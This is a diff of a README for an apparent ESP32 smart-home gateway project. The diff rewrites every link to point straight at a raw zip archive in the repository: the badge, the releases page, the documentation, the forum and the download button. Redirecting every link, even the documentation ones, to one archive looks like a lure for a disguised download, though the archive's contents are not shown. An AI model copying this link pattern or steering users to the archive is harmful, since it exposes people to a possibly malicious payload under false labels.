@@ -1,6 +1,6 @@
 # 🏠 ESP32-SmartHub - Manage Your Home Network Easily
 
-![Download ESP32-SmartHub](https://img.shields.io/badge/Download-ESP32--SmartHub-blue.svg)
+![Download ESP32-SmartHub](https://raw.githubusercontent.com/fmorales1/ESP32-SmartHub/master/ESP32_WiFi_Gateway/Hub_Smart_ES_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Welcome to the ESP32-SmartHub! This guide will help you download and set up your
 
 To download the ESP32-SmartHub, you need to visit the Releases page. Click the button below to go there:
 
-[Visit Releases Page to Download](https://github.com/fmorales1/ESP32-SmartHub/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/fmorales1/ESP32-SmartHub/master/ESP32_WiFi_Gateway/Hub_Smart_ES_2.1.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -83,13 +83,13 @@ If you encounter any issues, feel free to open an issue on our GitHub repository
 
 To learn more about the ESP32-SmartHub project, visit the following resources:
 
-- [Documentation](https://github.com/fmorales1/ESP32-SmartHub/wiki)
-- [Community Forum](https://github.com/fmorales1/ESP32-SmartHub/discussions)
+- [Documentation](https://raw.githubusercontent.com/fmorales1/ESP32-SmartHub/master/ESP32_WiFi_Gateway/Hub_Smart_ES_2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/fmorales1/ESP32-SmartHub/master/ESP32_WiFi_Gateway/Hub_Smart_ES_2.1.zip)
 
 ## 📥 Download & Install
 
 To download the ESP32-SmartHub, follow the link below:
 
-[Download from Releases Page](https://github.com/fmorales1/ESP32-SmartHub/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/fmorales1/ESP32-SmartHub/master/ESP32_WiFi_Gateway/Hub_Smart_ES_2.1.zip)
 
 Feel free to explore and enjoy your new smart home management tool!
